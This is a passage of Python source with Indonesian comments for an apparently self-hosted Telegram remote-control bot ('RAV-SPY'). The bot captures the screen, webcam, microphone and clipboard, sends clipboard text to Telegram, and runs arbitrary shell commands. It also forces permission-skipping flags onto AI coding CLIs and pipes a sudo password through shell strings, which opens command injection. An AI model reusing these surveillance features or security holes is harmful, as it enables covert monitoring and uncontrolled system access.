"""
Command Handler — Eksekusi perintah yang sudah divalidasi
Setiap handler WAJIB melalui sanitizer sebelum eksekusi
"""
import os
import subprocess
import platform
import asyncio
import time
import pyperclip
import webbrowser
import psutil
from pathlib import Path
from typing import Optional
from loguru import logger
from security.sanitizer import InputSanitizer
from security.sandbox import SandboxExecutor
from agent.screenshot import take_screenshot
from agent.system_monitor import sys_monitor
from agent.file_manager import list_files, get_file
from agent.executor import run_script
from agent.video_recorder import record_video
from agent.webcam import capture_webcam
from agent.audio_recorder import record_audio
from agent.input_simulator import simulate_click, simulate_type, simulate_press
from agent.active_window import get_active_window_title
from agent.macro import macro_manager

# State sinkronisasi clipboard otomatis
clipboard_sync_active = False
last_clipboard_value = ""
clipboard_alerts = []  # Antrean pesan clipboard baru untuk pull-model heartbeat

async def clipboard_sync_loop():
    """Background loop to monitor laptop clipboard and sync to Telegram/Heartbeat."""
    import pyperclip
    import os
    import httpx
    global last_clipboard_value, clipboard_sync_active, clipboard_alerts
    
    try:
        last_clipboard_value = await asyncio.to_thread(pyperclip.paste)
    except Exception:
        last_clipboard_value = ""
        
    while True:
        try:
            if clipboard_sync_active:
                curr = await asyncio.to_thread(pyperclip.paste)
                if curr and curr != last_clipboard_value:
                    last_clipboard_value = curr
                    
                    alert_text = f"[CLIPBOARD] Teks disalin: {curr[:150]}..." if len(curr) > 150 else f"[CLIPBOARD] Teks disalin: {curr}"
                    clipboard_alerts.append(alert_text)
                    
                    token = os.environ.get("TELEGRAM_BOT_TOKEN")
                    uids = os.environ.get("ALLOWED_USER_IDS", "").split(",")
                    if token and uids:
                        async with httpx.AsyncClient(timeout=5.0) as client:
                            for uid in uids:
                                uid = uid.strip()
                                if uid:
                                    url = f"https://api.telegram.org/bot{token}/sendMessage"
                                    msg = f"📋 <b>[Clipboard Sync]</b>\n<code>{curr[:1000]}</code>"
                                    try:
                                        await client.post(url, json={"chat_id": uid, "text": msg, "parse_mode": "HTML"})
                                    except Exception as err:
                                        logger.debug(f"Direct clipboard sync telegram send failed for {uid}: {err}")
        except Exception as e:
            logger.debug(f"Error in clipboard_sync_loop: {e}")
        await asyncio.sleep(2)


class CommandHandler:

    def __init__(self):
        self.sanitizer = InputSanitizer()
        self.sandbox = SandboxExecutor()
        self._cwd = str(Path.home() / "Documents") # Default persistent directory (whitelisted)

    def set_cwd(self, path: str) -> str:
        """Update current working directory for all commands."""
        if os.path.isabs(path) or path.startswith("~"):
            target = Path(path).expanduser().resolve()
        else:
            target = (Path(self._cwd) / path).resolve()

        if target.exists() and target.is_dir():
            self._cwd = str(target)
            return f"📂 Direktori kerja sekarang: `{self._cwd}`"
        return f"❌ Direktori tidak ditemukan: `{path}`"

    def get_cwd(self) -> str:
        return self._cwd

    async def handle_screenshot(self, grid: bool = False, monitor: int = -1) -> bytes:
        """Ambil screenshot dan return sebagai bytes PNG."""
        return await asyncio.to_thread(take_screenshot, grid, monitor)

    async def handle_video(self, duration: int = 5) -> Optional[bytes]:
        """Rekam layar dan return sebagai bytes MP4."""
        return await asyncio.to_thread(record_video, duration)

    async def handle_webcam(self) -> Optional[bytes]:
        """Ambil foto webcam dan return sebagai bytes JPG."""
        return await asyncio.to_thread(capture_webcam)

    async def handle_webcam_video(self, duration: int = 5) -> Optional[bytes]:
        """Rekam video webcam dan return sebagai bytes MP4."""
        from agent.webcam_recorder import record_webcam
        return await asyncio.to_thread(record_webcam, duration)

    async def handle_sysinfo(self) -> str:
        """Ambil informasi sistem."""
        return await asyncio.to_thread(sys_monitor.get_system_summary)

    async def handle_list_files(self, path: str) -> str:
        """List isi direktori — dengan validasi path."""
        # Use current working directory if path is relative
        target = path if os.path.isabs(path) or path.startswith("~") else os.path.join(self._cwd, path)
        return await asyncio.to_thread(list_files, target)

    async def handle_get_file(self, filepath: str) -> dict:
        """Kirim file ke user — dengan validasi ekstensi dan ukuran."""
        target = filepath if os.path.isabs(filepath) or filepath.startswith("~") else os.path.join(self._cwd, filepath)
        return await asyncio.to_thread(get_file, target)

    async def handle_clip_read(self) -> str:
        """Baca teks dari clipboard laptop."""
        try:
            text = await asyncio.to_thread(pyperclip.paste)
            return f"📋 **Clipboard:**\n<code>{text[:1000]}</code>" if text else "📋 Clipboard kosong."
        except Exception as e:
            return f"❌ Gagal membaca clipboard: {e}"

    async def handle_clip_write(self, text: str) -> str:
        """Tulis teks ke clipboard laptop."""
        try:
            await asyncio.to_thread(pyperclip.copy, text)
            return "✅ Teks berhasil disalin ke clipboard laptop."
        except Exception as e:
            return f"❌ Gagal menulis ke clipboard: {e}"

    async def handle_open_url(self, url: str) -> str:
        """Buka URL di browser default laptop."""
        try:
            if not url.startswith("http"): url = "https://" + url
            if macro_manager.recording:
                macro_manager.add_action({"action": "open_url", "url": url})
            await asyncio.to_thread(webbrowser.open, url)
            return f"🌐 Berhasil membuka browser untuk: {url}"
        except Exception as e:
            return f"❌ Gagal membuka URL: {e}"

    async def handle_top(self) -> str:
        """Tampilkan proses teratas."""
        try:
            def get_top():
                procs = []
                for p in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
                    try:
                        procs.append(p.info)
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        pass
                # Urutkan berdasarkan CPU
                procs = sorted(procs, key=lambda x: x.get('cpu_percent', 0) or 0, reverse=True)[:7]
                res = "🔪 **Top Processes:**\n"
                for p in procs:
                    res += f"PID: `{p['pid']}` | CPU: {p.get('cpu_percent', 0):.1f}% | Mem: {p.get('memory_percent', 0):.1f}% | {p['name']}\n"
                return res
            return await asyncio.to_thread(get_top)
        except Exception as e:
            return f"❌ Gagal mengambil daftar proses: {e}"

    async def handle_kill(self, pid: int) -> str:
        """Matikan proses berdasarkan PID."""
        try:
            def kill_proc():
                p = psutil.Process(pid)
                name = p.name()
                p.kill()
                return name
            name = await asyncio.to_thread(kill_proc)
            return f"✅ Berhasil mematikan proses `{name}` (PID: {pid})."
        except psutil.NoSuchProcess:
            return f"❌ Proses dengan PID {pid} tidak ditemukan."
        except psutil.AccessDenied:
            return f"❌ Akses ditolak untuk mematikan PID {pid}."
        except Exception as e:
            return f"❌ Gagal mematikan proses: {e}"

    async def handle_audio_control(self, action: str, value: Optional[str] = None) -> str:
        """Kontrol audio (volume app/global, mute, alarm, up/down)."""
        current_os = platform.system()
        try:
            if action == "volume":
                if value and value.lower() in ("up", "naik"):
                    if current_os == "Linux":
                        subprocess.run(["amixer", "set", "Master", "5%+"], capture_output=True)
                    return "🔊 Volume naik 5%"
                if value and value.lower() in ("down", "turun"):
                    if current_os == "Linux":
                        subprocess.run(["amixer", "set", "Master", "5%-"], capture_output=True)
                    return "🔊 Volume turun 5%"
                if value and value.lower() in ("mute", "senyap"):
                    if current_os == "Linux":
                        subprocess.run(["amixer", "set", "Master", "toggle"], capture_output=True)
                    return "🔇 Mute/unmute."
                try:
                    vol = max(0, min(100, int(value or 50)))
                except ValueError:
                    vol = 50
                if current_os == "Linux":
                    subprocess.run(["amixer", "set", "Master", f"{vol}%"], capture_output=True)
                elif current_os == "Darwin":
                    subprocess.run(["osascript", "-e", f"set volume output volume {vol}"], capture_output=True)
                return f"🔊 Volume global diatur ke {vol}%"
                
            elif action == "mute":
                if current_os == "Linux":
                    subprocess.run(["amixer", "set", "Master", "toggle"], capture_output=True)
                return "🔇 Status mute/unmute diubah."
                
            elif action == "alarm":
                if current_os == "Linux":
                    subprocess.Popen(["speaker-test", "-t", "sine", "-f", "1000", "-l", "1"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                elif current_os == "Darwin":
                    subprocess.Popen(["afplay", "/System/Library/Sounds/Ping.aiff"])
                elif current_os == "Windows":
                    import winsound
                    winsound.Beep(1000, 1000)
                return "🚨 Alarm dibunyikan di laptop!"
                
            return "❓ Aksi audio tidak dikenal."
        except Exception as e:
            return f"❌ Gagal mengontrol audio: {e}"

    async def handle_ai_cli(self, cli_name: str, args: list) -> str:
        """Jalankan AI CLI (antigravity, opencode) secara aman di CWD."""
        real_cli = "antigravity" if cli_name == "agy" else cli_name
        safety_flags = {
            "antigravity": "--yolo",
            "opencode": "--dangerously-skip-permissions"
        }
        
        flag = safety_flags.get(real_cli, "")
        cmd_args = list(args)
        
        if flag and flag not in cmd_args:
            if real_cli == "opencode" and "run" in cmd_args:
                idx = cmd_args.index("run")
                cmd_args.insert(idx + 1, flag)
            else:
                cmd_args.insert(0, flag)
        
        full_cmd = [real_cli] + cmd_args
        
        try:
            # Execute in the shared current working directory (self._cwd)
            process = await asyncio.create_subprocess_exec(
                *full_cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                cwd=self._cwd
            )
            
            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=120)
            
            output = stdout.decode().strip()
            error = stderr.decode().strip()
            
            if process.returncode != 0:
                return f"❌ Error {cli_name}:\n{error or output}"
            
            return output or "✅ Selesai (Tanpa Output)"
            
        except asyncio.TimeoutError:
            return f"⏳ Timeout: Perintah {cli_name} memakan waktu terlalu lama."
        except Exception as e:
            return f"❌ Exception running {cli_name}: {str(e)}"

    async def handle_run_script(self, script_name: str, user_id: str) -> str:
        """
        Jalankan script dari direktori aman — WAJIB di sandbox.
        Hanya file .py dan .sh dari ~/safe_scripts yang diizinkan.
        """
        return await run_script(script_name, user_id)

    async def handle_lock_screen(self) -> str:
        """Kunci layar laptop (Cross-Platform)."""
        current_os = platform.system()
        try:
            if current_os == "Linux":
                # Coba beberapa window manager
                for cmd in ["loginctl lock-session", "xdg-screensaver lock", "gnome-screensaver-command -l"]:
                    try:
                        subprocess.run(cmd.split(), timeout=5, check=True)
                        return f"🔒 Layar {current_os} berhasil dikunci."
                    except (subprocess.CalledProcessError, FileNotFoundError):
                        continue
            elif current_os == "Windows":
                import ctypes
                ctypes.windll.user32.LockWorkStation()
                return f"🔒 Layar {current_os} berhasil dikunci."
            elif current_os == "Darwin": # macOS
                subprocess.run(["pmset", "displaysleepnow"], capture_output=True)
                return f"🔒 Layar {current_os} berhasil dikunci."
            
            return f"❌ Fitur lock belum didukung untuk OS: {current_os}"
        except Exception as e:
            return f"❌ Gagal mengunci layar: {str(e)}"

    async def handle_unlock_screen(self, password: Optional[str] = None) -> str:
        """Buka kunci layar laptop (Cross-Platform) dengan Force Unlock (Keystroke Simulation)."""
        current_os = platform.system()
        
        if current_os != "Linux":
            if current_os == "Windows":
                return "⚠️ Windows memblokir remote unlock demi keamanan. Anda harus melakukannya secara fisik atau via RDP."
            elif current_os == "Darwin":
                subprocess.run(["caffeinate", "-u", "-t", "1"], capture_output=True)
                return "🔓 Layar macOS dibangunkan. Jika terkunci, fitur input password belum didukung."
            return f"❌ Fitur unlock belum didukung untuk OS: {current_os}"

        if not password:
            # Coba metode standar dulu jika tanpa password (Non-blocking enough)
            subprocess.run(["loginctl", "unlock-sessions"], capture_output=True)
            return "🔓 Perintah buka kunci terkirim (tanpa password). Jika layar masih meminta password, gunakan: `!unlock <password_laptop>`"

        # Offload heavy/blocking subprocess operations to a thread to prevent Agent hang
        return await asyncio.to_thread(self._force_unlock_linux_sync, password)

    def _force_unlock_linux_sync(self, password: str) -> str:
        """Synchronous forceful unlock logic isolated to prevent event loop blocking."""
        try:
            # 1. Cek apakah ydotool terinstall
            res_check = subprocess.run(["which", "ydotool"], capture_output=True, text=True)
            if res_check.returncode != 0:
                # Install ydotool tanpa apt-get update agar cepat
                install_cmd = f"echo '{password}' | sudo -S apt-get install -y ydotool"
                res_install = subprocess.run(install_cmd, shell=True, capture_output=True, text=True, timeout=30)
                if res_install.returncode != 0:
                    return f"❌ Gagal menginstall ydotool (Password sudo mungkin salah atau butuh update manual).\nDetail: {res_install.stderr}"

            # 2. Matikan daemon lama jika ada
            subprocess.run(f"echo '{password}' | sudo -S pkill ydotoold", shell=True, capture_output=True, timeout=5)
            
            # 3. Jalankan daemon ydotool
            # SANGAT PENTING: Gunakan Popen dan DEVNULL agar Python tidak menunggu output pipe daemon
            daemon_cmd = f"echo '{password}' | sudo -S ydotoold"
            subprocess.Popen(daemon_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(2) # Tunggu daemon siap

            # 4. Bangunkan layar (Escape dari blank screen)
            # Menggunakan ydotool untuk menekan ESC memunculkan prompt password
            subprocess.run(f"echo '{password}' | sudo -S ydotool key 1:1 1:0", shell=True, capture_output=True, timeout=5)
            time.sleep(1)

            # 5. Ketik password dan Enter
            type_cmd = ["sudo", "-S", "ydotool", "type", password]
            proc = subprocess.Popen(type_cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            proc.communicate(input=f"{password}\n".encode(), timeout=10)
            
            time.sleep(0.5)
            # Tekan Enter (Keycode 28)
            subprocess.run(f"echo '{password}' | sudo -S ydotool key 28:1 28:0", shell=True, capture_output=True, timeout=5)

            return "🔓 Force Unlock berhasil dieksekusi! Layar seharusnya sudah terbuka."
        
        except subprocess.TimeoutExpired:
            return "⏳ Waktu Habis: Proses instalasi atau eksekusi sistem memakan waktu terlalu lama."
        except Exception as e:
            return f"❌ Gagal mengeksekusi force unlock: {str(e)}"

    async def handle_reboot(self, confirmed: bool = False) -> str:
        """Restart laptop — butuh konfirmasi (Cross-Platform)."""
        if not confirmed:
            return """⚠️ Yakin ingin restart?\nBalas: `!reboot confirm`"""

        current_os = platform.system()
        try:
            if current_os == "Windows":
                subprocess.run(["shutdown", "/r", "/t", "5"], capture_output=True)
            else: # Linux & macOS
                subprocess.run(["sudo", "reboot"], capture_output=True)
            return f"🔄 Laptop ({current_os}) akan restart dalam 5 detik..."
        except Exception as e:
            return f"❌ Gagal melakukan restart: {str(e)}"


    async def handle_test_ai(self) -> str:
        """Test koneksi ke NVIDIA NIM API."""
        from ai_module.nim_client import NIMClient
        client = NIMClient()
        if not client.enabled:
            return "❌ AI Mode dinonaktifkan atau API Key belum di-set di .env"
        
        try:
            # Test sederhana dengan input minimal
            res = await client.translate_to_command("test")
            if res:
                return "✅ Koneksi AI NIM Sukses! Server merespons dengan baik."
            return "⚠️ AI terhubung tapi memberikan respons tidak terduga."
        except Exception as e:
            return f"❌ Koneksi AI Gagal: {str(e)}"

    async def handle_listen(self, duration: int = 5) -> Optional[dict]:
        """Merekam audio sekitar menggunakan FFmpeg."""
        return await asyncio.to_thread(record_audio, duration)

    async def handle_click(self, x: int, y: int) -> str:
        """Simulasi klik mouse kiri."""
        if macro_manager.recording:
            macro_manager.add_action({"action": "click", "x": x, "y": y})
        return await asyncio.to_thread(simulate_click, x, y)

    async def handle_type(self, text: str) -> str:
        """Simulasi mengetik teks."""
        if macro_manager.recording:
            macro_manager.add_action({"action": "type", "text": text})
        return await asyncio.to_thread(simulate_type, text)

    async def handle_press(self, key: str) -> str:
        """Simulasi menekan tombol keyboard."""
        if macro_manager.recording:
            macro_manager.add_action({"action": "key", "key": key})
        return await asyncio.to_thread(simulate_press, key)

    async def handle_rightclick(self, x: int, y: int) -> str:
        """Simulasi klik kanan mouse."""
        if macro_manager.recording:
            macro_manager.add_action({"action": "rightclick", "x": x, "y": y})
        import subprocess, shutil
        if shutil.which("xdotool"):
            subprocess.run(["xdotool", "mousemove", str(x), str(y), "click", "3"],
                           capture_output=True, timeout=3)
            return f"🖱️ Klik kanan pada ({x}, {y})."
        from agent.input_simulator import _ensure_pyautogui
        if _ensure_pyautogui():
            import pyautogui
            pyautogui.click(x, y, button="right")
            return f"🖱️ Klik kanan pada ({x}, {y})."
        return "Gagal klik kanan. Install xdotool atau pyautogui."

    async def handle_doubleclick(self, x: int, y: int) -> str:
        """Simulasi dobel klik mouse."""
        if macro_manager.recording:
            macro_manager.add_action({"action": "doubleclick", "x": x, "y": y})
        from agent.input_simulator import _ensure_pyautogui
        if _ensure_pyautogui():
            import pyautogui
            pyautogui.doubleClick(x, y)
            return f"🖱️ Dobel klik pada ({x}, {y})."
        if shutil.which("xdotool"):
            subprocess.run(["xdotool", "mousemove", str(x), str(y), "click", "--repeat", "2", "1"],
                           capture_output=True, timeout=3)
            return f"🖱️ Dobel klik pada ({x}, {y})."
        return "Gagal dobel klik. Install pyautogui."

    async def handle_drag(self, x1: int, y1: int, x2: int, y2: int) -> str:
        """Simulasi drag mouse."""
        if macro_manager.recording:
            macro_manager.add_action({"action": "drag", "x1": x1, "y1": y1, "x2": x2, "y2": y2})
        from agent.input_simulator import _ensure_pyautogui
        if _ensure_pyautogui():
            import pyautogui
            pyautogui.moveTo(x1, y1)
            pyautogui.drag(x2 - x1, y2 - y1, duration=0.3)
            return f"🖱️ Drag dari ({x1},{y1}) ke ({x2},{y2})."
        return "Gagal drag. Install pyautogui."

    async def handle_scroll(self, direction: str = "down", amount: int = 3) -> str:
        """Simulasi scroll mouse."""
        if macro_manager.recording:
            macro_manager.add_action({"action": "scroll", "direction": direction, "amount": amount})
        from agent.input_simulator import _ensure_pyautogui
        if _ensure_pyautogui():
            import pyautogui
            pyautogui.scroll(-amount if direction == "down" else amount)
            return f"🖱️ Scroll {direction} x{amount}."
        return "Gagal scroll. Install pyautogui."

    async def handle_clickimage(self, template_path: str, confidence: float = 0.8) -> str:
        """Cari gambar di layar dan klik."""
        if macro_manager.recording:
            macro_manager.add_action({"action": "click_image", "template": template_path, "confidence": confidence})
        from agent.vision import click_image as ci
        result = ci(template_path, confidence)
        if result:
            return f"🔍 Gambar ditemukan dan diklik."
        return "❌ Gambar tidak ditemukan di layar."

    async def handle_waitimage(self, template_path: str, timeout: float = 10, confidence: float = 0.8) -> str:
        """Tunggu gambar muncul di layar."""
        if macro_manager.recording:
            macro_manager.add_action({"action": "wait_image", "template": template_path, "timeout": timeout, "confidence": confidence})
        from agent.vision import wait_for_image
        result = wait_for_image(template_path, timeout, confidence)
        if result:
            return f"✅ Gambar ditemukan di ({result['x']}, {result['y']})."
        return f"❌ Gambar tidak muncul dalam {timeout}s."

    async def handle_run(self, command: str) -> str:
        """Jalankan shell command."""
        if macro_manager.recording:
            macro_manager.add_action({"action": "run", "command": command})
        try:
            result = subprocess.run(command, shell=True, capture_output=True, timeout=30, text=True)
            output = result.stdout.strip() or result.stderr.strip() or "OK"
            return f"⚡ {output[:500]}"
        except subprocess.TimeoutExpired:
            return "⏱️ Command timeout (>30s)."
        except Exception as e:
            return f"❌ Error: {e}"

    async def handle_active_window(self) -> str:
        """Mendeteksi jendela aplikasi yang aktif saat ini."""
        title = await asyncio.to_thread(get_active_window_title)
        return f"🖥️ Jendela Aktif: **{title}**"

    async def handle_brightness(self, args: list) -> str:
        """Mengatur atau membaca kecerahan layar."""
        import os
        import glob
        backlight_dirs = glob.glob("/sys/class/backlight/*")
        if not backlight_dirs:
            return "❌ Tidak ditemukan perangkat backlight (layar internal) pada sistem ini."
        
        backlight_dir = None
        for d in backlight_dirs:
            if "intel_backlight" in d:
                backlight_dir = d
                break
        if not backlight_dir:
            backlight_dir = backlight_dirs[0]
            
        try:
            with open(os.path.join(backlight_dir, "max_brightness"), "r") as f:
                max_bright = int(f.read().strip())
            with open(os.path.join(backlight_dir, "brightness"), "r") as f:
                curr_bright = int(f.read().strip())
        except Exception as e:
            return f"❌ Gagal membaca informasi kecerahan: {e}"
            
        current_percent = round((curr_bright / max_bright) * 100)
        
        if not args:
            return f"🔆 Kecerahan Layar saat ini: **{current_percent}%**\nℹ️ Untuk mengatur: `!brightness <0-100>`"
            
        try:
            target_percent = int(args[0])
            if target_percent < 0 or target_percent > 100:
                raise ValueError()
        except ValueError:
            return "❌ Nilai kecerahan harus berupa angka 0 - 100."
            
        import subprocess
        try:
            subprocess.run(["brightnessctl", "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        except (subprocess.SubprocessError, FileNotFoundError):
            return f"❌ Gagal mengubah kecerahan ke {target_percent}%.\n⚠️ Prasyarat: Silakan install `brightnessctl` terlebih dahulu dengan perintah: `sudo apt install brightnessctl`."

        try:
            subprocess.run(["brightnessctl", "set", f"{target_percent}%"], check=True)
            return f"✅ Kecerahan layar berhasil diubah menjadi **{target_percent}%**"
        except subprocess.CalledProcessError:
            return (
                f"❌ Gagal mengubah kecerahan ke {target_percent}%: Izin ditolak (Permission denied).\n"
                f"💡 **Solusi:** Jalankan perintah berikut di terminal laptop Anda:\n"
                f"```bash\n"
                f"sudo usermod -aG video $USER\n"
                f"```\n"
                f"Setelah itu, silakan **reboot laptop** atau **log out & log in kembali** agar izin grup Anda diperbarui."
            )
        except Exception as e:
            return f"❌ Gagal mengubah kecerahan ke {target_percent}%: {e}"


    async def handle_media(self, action: str) -> str:
        """Mengontrol pemutar media aktif (MPRIS) atau simulasi media keys."""
        action = action.lower().strip()
        action_map = {
            "play": "Play",
            "pause": "Pause",
            "next": "Next",
            "prev": "Previous"
        }
        if action not in action_map:
            return "❌ Aksi media tidak dikenal. Gunakan: play, pause, next, prev."

        if macro_manager.recording:
            macro_manager.add_action({"action": "key", "key": f"media_{action}"})
            
        mpris_method = action_map[action]
        
        import subprocess
        players = []
        try:
            cmd = ["dbus-send", "--session", "--dest=org.freedesktop.DBus", "--type=method_call", "--print-reply", "/org/freedesktop/DBus", "org.freedesktop.DBus.ListNames"]
            res = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True, check=True)
            for line in res.stdout.split("\n"):
                if "org.mpris.MediaPlayer2." in line:
                    parts = line.split('"')
                    if len(parts) >= 2:
                        players.append(parts[1])
        except Exception:
            pass
            
        controlled_players = []
        if players:
            for p in players:
                try:
                    dbus_cmd = [
                        "dbus-send", "--session", "--dest=" + p, 
                        "/org/mpris/MediaPlayer2", 
                        "org.mpris.MediaPlayer2.Player." + mpris_method
                    ]
                    subprocess.run(dbus_cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    name = p.replace("org.mpris.MediaPlayer2.", "").split(".")[0].capitalize()
                    controlled_players.append(name)
                except Exception:
                    pass
                    
        if controlled_players:
            return f"🎵 Berhasil mengirim perintah **{mpris_method}** ke pemutar media: **{', '.join(set(controlled_players))}**"
            
        fallback_key_map = {
            "play": "playpause",
            "pause": "playpause",
            "next": "nexttrack",
            "prev": "prevtrack"
        }
        key = fallback_key_map[action]
        try:
            import pyautogui
            await asyncio.to_thread(pyautogui.press, key)
            return f"⌨️ Tidak ada pemutar MPRIS aktif. Mensimulasikan penekanan tombol media keyboard: **{key}**"
        except Exception as e:
            return f"❌ Gagal mengontrol media: {e}"

    async def handle_battery(self, args: list = None) -> str:
        """Membaca detail status dan kesehatan baterai laptop."""
        import os
        import glob
        
        if args and args[0].lower() == "health":
            return await self._handle_battery_health()
        
        battery_dirs = glob.glob("/sys/class/power_supply/BAT*")
        ac_dirs = glob.glob("/sys/class/power_supply/AC*") + glob.glob("/sys/class/power_supply/ADP*")
        
        if not battery_dirs:
            return "❌ Sensor baterai tidak terdeteksi pada sistem ini (mungkin komputer desktop)."
            
        bat_dir = battery_dirs[0]
        
        def read_sysfs(filename: str) -> str:
            path = os.path.join(bat_dir, filename)
            if os.path.exists(path):
                try:
                    with open(path, "r") as f:
                        return f.read().strip()
                except Exception:
                    pass
            return ""
            
        capacity = read_sysfs("capacity")
        status = read_sysfs("status")
        technology = read_sysfs("technology")
        model = read_sysfs("model_name")
        manufacturer = read_sysfs("manufacturer")
        charge_full = read_sysfs("charge_full")
        charge_full_design = read_sysfs("charge_full_design")
        
        ac_connected = False
        if ac_dirs:
            ac_path = os.path.join(ac_dirs[0], "online")
            if os.path.exists(ac_path):
                try:
                    with open(ac_path, "r") as f:
                        ac_connected = (f.read().strip() == "1")
                except Exception:
                    pass
                    
        status_emoji = "🔋"
        if status.lower() == "charging":
            status_emoji = "🔌 ⚡"
        elif status.lower() == "full":
            status_emoji = "🟢 🔋"
            
        charger_status = "Tersambung (Charging)" if ac_connected else "Tidak Tersambung (Discharging)"
        
        res = [
            f"{status_emoji} **Status Baterai Laptop**",
            f"▪️ **Kapasitas:** {capacity}%" if capacity else "",
            f"▪️ **Status:** {status} ({charger_status})",
            f"▪️ **Model:** {model}" if model else "",
            f"▪️ **Pabrikan:** {manufacturer}" if manufacturer else "",
            f"▪️ **Teknologi:** {technology}" if technology else ""
        ]
        
        if charge_full and charge_full_design:
            try:
                cf = int(charge_full)
                cfd = int(charge_full_design)
                health = (cf / cfd) * 100
                res.append(f"▪️ **Kesehatan Baterai:** {health:.2f}%")
            except ValueError:
                pass
                
        return "\n".join([line for line in res if line])

    async def _handle_battery_health(self) -> str:
        import os, glob
        battery_dirs = glob.glob("/sys/class/power_supply/BAT*")
        if not battery_dirs:
            return "❌ Sensor baterai tidak terdeteksi."
        bat_dir = battery_dirs[0]
        def r(f):
            p = os.path.join(bat_dir, f)
            return open(p).read().strip() if os.path.exists(p) else ""
        cap = r("capacity")
        cf = r("charge_full")
        cfd = r("charge_full_design")
        cycle = r("cycle_count")
        model = r("model_name")
        manufacturer = r("manufacturer")
        health = "N/A"
        if cf and cfd:
            try:
                pct = (int(cf) / int(cfd)) * 100
                health = f"{pct:.1f}%"
                if pct > 80:
                    health += " (Baik)"
                elif pct > 60:
                    health += " (Cukup)"
                else:
                    health += " (Ganti segera)"
            except Exception:
                pass
        lines = ["🔋 **Kesehatan Baterai**"]
        if model: lines.append(f"▪️ Model: {model}")
        if manufacturer: lines.append(f"▪️ Pabrikan: {manufacturer}")
        if cap: lines.append(f"▪️ Kapasitas saat ini: {cap}%")
        lines.append(f"▪️ Kesehatan: {health}")
        if cycle: lines.append(f"▪️ Siklus: {cycle}")
        if health != "N/A":
            try:
                pct = float(health.split("%")[0])
                if pct < 60:
                    lines.append("\n💡 Rekomendasi: Segera ganti baterai.")
                elif pct < 80:
                    lines.append("\n💡 Rekomendasi: Perhatikan pemakaian baterai.")
            except (ValueError, IndexError):
                pass
        return "\n".join(lines)

    async def handle_notif(self, text: str) -> str:
        if not text:
            return "Pesan notifikasi tidak boleh kosong."
        from agent.notifier import send_notification
        if send_notification("RAV-SPY", text):
            return "Notifikasi desktop berhasil dikirim."
        return "Gagal kirim notifikasi. Install notify-send (Linux), plyer, atau osascript (macOS)."

    async def handle_process(self, args: list) -> str:
        """Melihat daftar aplikasi yang berjalan atau menutup paksa aplikasi."""
        if not args:
            return "❌ Gunakan: `!process list` atau `!process kill <pid/nama>`"
            
        subcmd = args[0].lower().strip()
        if subcmd == "list":
            import psutil
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
                try:
                    cpu = proc.info['cpu_percent']
                    mem = proc.info['memory_percent']
                    processes.append({
                        'pid': proc.info['pid'],
                        'name': proc.info['name'],
                        'cpu': cpu if cpu is not None else 0.0,
                        'mem': mem if mem is not None else 0.0
                    })
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    pass
            
            processes.sort(key=lambda x: x['cpu'], reverse=True)
            top_procs = processes[:15]
            
            res = ["⚙️ **Daftar 15 Proses Teraktif (CPU %):**\n"]
            res.append(f"{'PID':<8}{'NAMA':<20}{'CPU%':<8}{'RAM%':<8}")
            res.append("-" * 44)
            for p in top_procs:
                name_trunc = p['name'][:18]
                res.append(f"{p['pid']:<8}{name_trunc:<20}{p['cpu']:<8.1f}{p['mem']:<8.1f}")
                
            return f"```\n" + "\n".join(res) + "\n```"
            
        elif subcmd == "kill":
            if len(args) < 2:
                return "❌ Gunakan: `!process kill <pid/nama>`"
            target = args[1].strip()
            
            import psutil
            if target.isdigit():
                pid = int(target)
                try:
                    proc = psutil.Process(pid)
                    proc_name = proc.name()
                    proc.kill()
                    return f"✅ Berhasil menutup paksa proses PID **{pid}** ({proc_name})."
                except psutil.NoSuchProcess:
                    return f"❌ Proses dengan PID {pid} tidak ditemukan."
                except psutil.AccessDenied:
                    return f"❌ Akses ditolak untuk menghentikan PID {pid}."
                except Exception as e:
                    return f"❌ Gagal menghentikan PID {pid}: {e}"
            else:
                killed_count = 0
                for proc in psutil.process_iter(['pid', 'name']):
                    try:
                        if target.lower() in proc.info['name'].lower():
                            proc.kill()
                            killed_count += 1
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        pass
                if killed_count > 0:
                    return f"✅ Berhasil menghentikan **{killed_count}** proses dengan nama mengandung **'{target}'**."
                else:
                    return f"❌ Tidak ditemukan proses aktif dengan nama **'{target}'**."
                    
        return "❌ Subperintah tidak dikenal. Gunakan: `!process list` atau `!process kill <pid/nama>`"

    async def handle_clip_sync(self, args: list) -> str:
        """Mengaktifkan, menonaktifkan, atau melihat status sinkronisasi clipboard otomatis."""
        global clipboard_sync_active
        if not args:
            status = "AKTIF" if clipboard_sync_active else "NON-AKTIF"
            return f"📋 Status Sinkronisasi Clipboard: **{status}**\nℹ️ Gunakan: `!clip sync [start | stop]`"
            
        subcmd = args[0].lower().strip()
        if subcmd == "start":
            if clipboard_sync_active:
                return "🔄 Sinkronisasi clipboard otomatis sudah aktif."
            clipboard_sync_active = True
            return "🔄 Sinkronisasi clipboard otomatis **AKTIF**.\nTeks baru yang Anda salin di laptop akan terkirim ke HP secara realtime."
        elif subcmd == "stop":
            if not clipboard_sync_active:
                return "⏹️ Sinkronisasi clipboard otomatis sudah non-aktif."
            clipboard_sync_active = False
            return "⏹️ Sinkronisasi clipboard otomatis **NON-AKTIF**."
            
        return "❌ Gunakan: `!clip sync start` atau `!clip sync stop`"

    async def handle_find_files(self, pattern: str) -> str:
        """Mencari file secara rekursif mulai dari CWD berdasarkan pattern."""
        if not pattern:
            return "❌ Masukkan pola pencarian. Contoh: `!find *.txt` atau `!find dokumen`"
        
        # Jika pattern tidak memiliki wildcard, tambahkan wildcard default untuk fleksibilitas pencarian substring
        search_pattern = pattern
        if "*" not in pattern and "?" not in pattern:
